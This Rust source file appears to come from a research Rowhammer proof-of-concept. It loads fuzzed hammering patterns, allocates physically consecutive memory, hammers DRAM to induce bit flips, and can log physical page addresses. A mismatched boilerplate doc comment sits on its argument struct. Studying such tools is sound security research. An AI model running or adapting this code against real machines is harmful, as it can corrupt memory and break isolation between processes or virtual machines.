use std::{
    env,
    fs::File,
    io::{stdin, BufReader},
    process::Command,
    ptr::null_mut,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
    thread,
};

use anyhow::{bail, Context};
use bs_poc::{
    forge::{FuzzSummary, Hammerer, Hammering, HammeringPattern},
    jitter::AggressorPtr,
    memory::{
        AllocCheck, AllocCheckSameBank, AllocChecker, ConsecAllocBuddyInfo, ConsecAllocCoCo,
        ConsecAllocHugepageRnd, ConsecAllocator, ConsecCheckNone, ConsecCheckPfn,
        HugepageAllocator, LinuxPageMap, VirtToPhysResolver,
    },
    util::{retry, BlacksmithConfig, MemConfiguration, MB, PAGE_SIZE},
    victim::{HammerVictim, HammerVictimMemCheck},
};
use clap::Parser;
use indicatif::{MultiProgress, ProgressBar};
use indicatif_log_bridge::LogWrapper;
use libc::{MAP_ANONYMOUS, MAP_PRIVATE, PROT_READ, PROT_WRITE};
use log::{info, warn};

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The bait-alloc mode.
    #[clap(long = "mode", default_value = "bait")]
    mode: BaitMode,
    ///The BlacksmithConfig
    #[clap(long = "config")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(long = "pattern")]
    pattern: Option<String>,
    /// The mapping ID to load from the JSON file (optional, will determine most optimal pattern if omitted)
    #[clap(long = "mapping")]
    mapping: Option<String>,
    #[clap(long = "consec-check", default_value = "pfn")]
    consec_check: ConsecCheckType,
    #[clap(long = "alloc-strategy", default_value = "hugepage")]
    alloc_strategy: ConsecAllocType,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum ConsecCheckType {
    None,
    Pfn,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum ConsecAllocType {
    BuddyInfo,
    // Allocate using the CoCo dec mem module: https://git.its.uni-luebeck.de/research-projects/tdx/kmod-coco-dec-mem
    CoCo,
    Hugepage,
    HugepageRnd,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum BaitMode {
    Bait,
    Prey,
}

const PREY_PAGE_COUNT: usize = 500;

fn _prog() -> Option<String> {
    env::args().next().as_ref().cloned()
}

/// Send a signal `sig` to the process `pid`
fn _signal(sig: &str, pid: u32) -> anyhow::Result<()> {
    let mut kill = Command::new("kill")
        .args(["-s", sig, &pid.to_string()])
        .spawn()?;
    kill.wait()?;
    Ok(())
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(&option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

fn make_vec<T>(n: usize, f: &dyn Fn(usize) -> T) -> Vec<T> {
    let mut v = Vec::with_capacity(n);
    for i in 0..n {
        let val = f(i);
        v.push(val);
    }
    v
}

fn create_checker_from_cli(consec_check: ConsecCheckType) -> Box<dyn AllocChecker> {
    match consec_check {
        ConsecCheckType::None => Box::new(ConsecCheckNone {}),
        ConsecCheckType::Pfn => Box::new(ConsecCheckPfn {}),
    }
}

fn create_allocator_from_cli(
    alloc_strategy: ConsecAllocType,
    consec_checker: Box<dyn AllocChecker>,
) -> Box<dyn ConsecAllocator> {
    match alloc_strategy {
        ConsecAllocType::BuddyInfo => Box::new(ConsecAllocBuddyInfo::new(consec_checker)),
        ConsecAllocType::CoCo => Box::new(ConsecAllocCoCo {}),
        ConsecAllocType::Hugepage => Box::new(HugepageAllocator::new()),
        ConsecAllocType::HugepageRnd => {
            let hugepages = make_vec(10, &|_| unsafe {
                HugepageAllocator::new()
                    .alloc_consec_blocks(1024 * MB, &|| {})
                    .expect("hugepage alloc")
            });
            Box::new(ConsecAllocHugepageRnd::new(hugepages))
        }
    }
}

unsafe fn mode_bait(args: CliArgs) -> anyhow::Result<()> {
    // wrap logger for indicatif
    let logger =
        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).build();
    let multi = MultiProgress::new();

    LogWrapper::new(multi.clone(), logger).try_init()?;

    let pg = multi.add(ProgressBar::new(10));
    let config = BlacksmithConfig::from_jsonfile(&args.config).with_context(|| "from_jsonfile")?;
    let mem_config =
        MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);

    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(&mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    info!("Flips in mapping: {:?}", &mapping.bit_flips);

    /*
    // find offset from base and mapping start
    let mapping_base = find_mapping_base(mapping.clone(), mem_config, BASE_MSB as *const u8);
    let mapping_end = DRAMAddr::new(mapping.bank_no, mapping.max_row, 0)
        .to_virt(BASE_MSB as *const u8, mem_config);
    let num_rows = mapping_end as usize - mapping_base as usize + 1;
    let flips = &mapping.bit_flips;
    for flips in flips {
        for flip in flips {
            info!(
                "flip {:?}: {}",
                flip,
                flip.dram_addr.to_virt(BASE_MSB as *const u8, mem_config) as usize >> 20
            );
        }
    }
    info!("flips: {:?}", flips);
    //let flip_aggr_offset = find_flip_aggr_offset(mapping.clone(), mem_config)?;
    info!("base_msb: {:?}", BASE_MSB as *const u8);
    info!("determined mapping base as {:?}", mapping_base);
    info!("mapping length: {}", num_rows);
    //info!("determined flip aggr offset as {}", flip_aggr_offset);

    for (aggr, addr) in &mapping.aggressor_to_addr {
        debug!(
            "{:?}: {:?}, {:?}",
            aggr,
            addr,
            addr.to_virt(BASE_MSB as AggressorPtr, mem_config)
        );
    }

    let mapping_min = DRAMAddr::new(mapping.bank_no, mapping.min_row, 0);
    let mapping_max = DRAMAddr::new(mapping.bank_no, mapping.max_row, 0);
    info!(
        "mapping range: [{:?}, {:?}], [{:?}, {:?}]",
        mapping_min,
        mapping_max,
        mapping_min.to_virt(BASE_MSB, mem_config),
        mapping_max.to_virt(BASE_MSB, mem_config)
    );
    */

    //log_pagetypeinfo();
    //let prog = prog().expect("prog");
    //let child = Command::new(prog)
    //    .stdout(Stdio::piped())
    //    .args(["--mode", "prey"])
    //    .spawn()?;
    //let mut set_iter = sets.iter();
    //let mut cur = set_iter.next();
    //while let Some((base, _)) = cur {

    // get mapping size, round to nearest multiple of PAGE_SIZE
    let checker = create_checker_from_cli(args.consec_check);
    let bank_checker = Box::new(AllocCheckSameBank {});
    let checker = AllocCheck::And(checker, bank_checker);
    let alloc_strategy: Box<dyn ConsecAllocator> =
        create_allocator_from_cli(args.alloc_strategy, Box::new(checker));

    let block_size = alloc_strategy.block_size();
    let block_shift = block_size.ilog2() as usize;
    let num_sets = mapping.aggressor_sets(mem_config, block_shift).len();
    pg.set_length(num_sets as u64);

    loop {
        pg.set_position(0);
        let memory = alloc_strategy.alloc_consec_blocks(num_sets * block_size, &|| pg.inc(1))?;
        pg.finish_and_clear();
        let hammering_addrs = mapping.get_hammering_addresses_relocate(
            &pattern.access_ids,
            mem_config,
            block_shift,
            &memory.blocks,
        )?;

        let hammerer = Hammerer::new(
            mem_config,
            pattern.clone(),
            mapping.clone(),
            &hammering_addrs,
            &memory.blocks,
        )?;
        //let hammerer = DummyHammerer::new(&memory, 17);
        let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);

        info!("Hammering pattern. This might take a while...");
        let res = hammerer.hammer(&mut victim, 3);
        match res {
            Ok(res) => {
                info!("{:?}", res);
                victim.log_report(0 as AggressorPtr);
            }
            Err(e) => {
                warn!("Hammering not successful: {:?}", e);
                memory.dealloc();
                continue;
            }
        }

        // signal child process
        //signal("INT", child.id())?;
        //let _output = child.wait_with_output().expect("child wait");
        //thread::sleep(std::time::Duration::from_secs(2));

        // cleanup
        //libc::munmap(v as *mut c_void, 2 * MB);
        // TODO munmap all allocation

        memory.dealloc();
        //return Ok(());
    }
}

unsafe fn mode_prey(mut resolver: LinuxPageMap) -> anyhow::Result<()> {
    env_logger::init();
    // setup signal handler
    let waiting = Arc::new(AtomicBool::new(true));
    let waiting_sigh = waiting.clone();
    ctrlc::set_handler(move || {
        waiting_sigh.store(false, Ordering::SeqCst);
    })
    .expect("ctrlc setup failed");

    // wait for signal
    while waiting.load(Ordering::SeqCst) {
        thread::sleep(std::time::Duration::from_millis(1));
    }

    // allocate 500 4K pages
    let mut virt = [std::ptr::null_mut(); PREY_PAGE_COUNT];
    let mut phys = [0_u64; PREY_PAGE_COUNT];

    // allocate pages
    for i in 0..PREY_PAGE_COUNT {
        let v = libc::mmap(
            null_mut(),
            PAGE_SIZE,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0,
        );
        //let v = libc::malloc(PAGE_LEN);
        libc::memset(v, 0_i32, PAGE_SIZE);
        let p = resolver
            .get_phys(v as u64)
            .context("virt_to_phys failed. Are we root?")?;
        phys[i] = p;
        virt[i] = v;
    }

    // log phys addrs to stdout
    for i in 0..PREY_PAGE_COUNT {
        println!("{}", phys[i]);
    }

    for i in 0..PREY_PAGE_COUNT {
        libc::munmap(virt[i], PAGE_SIZE);
    }

    Ok(())
}

unsafe fn _main() -> anyhow::Result<()> {
    let args = CliArgs::parse();

    let resolver = LinuxPageMap::new()?;

    match args.mode {
        BaitMode::Bait => mode_bait(args),
        BaitMode::Prey => mode_prey(resolver),
    }
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
